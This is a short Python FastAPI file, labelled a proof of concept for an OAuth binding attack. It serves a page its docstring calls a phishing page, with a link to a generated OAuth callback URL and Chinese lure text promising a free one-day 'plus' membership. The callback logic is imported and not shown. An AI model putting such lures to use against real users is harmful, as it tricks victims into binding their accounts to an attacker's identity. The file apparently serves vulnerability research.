# coding=utf-8

from fastapi import FastAPI
from starlette.responses import HTMLResponse

from poc.oauth import gen_oauth_callback_url

app = FastAPI()


@app.get("/", response_class=HTMLResponse)
async def fishing_page():
    """钓鱼页面"""
    return (
        "<h1>POC of OAuth binding attack</h1>"
        f"<a href='{gen_oauth_callback_url()}'>点击领取一天 plus 会员</a>"
    )
